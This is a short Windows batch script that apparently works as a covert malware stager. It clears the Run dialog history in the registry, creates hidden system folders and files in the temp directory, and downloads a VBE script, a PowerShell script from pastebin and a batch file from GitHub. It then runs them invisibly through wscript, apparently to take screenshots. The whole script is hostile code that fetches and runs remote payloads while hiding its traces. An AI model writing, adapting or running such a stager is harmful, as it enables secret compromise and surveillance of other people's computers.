@echo off
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
cd %temp%
if not exist s\ (
  mkdir s
)
attrib +s +h s
attrib +s +h s.bat
cd s
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
curl -s https://pastebin.com/dsLQmyew -o s.ps1
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
wscript.exe "i.vbe" "r.bat"
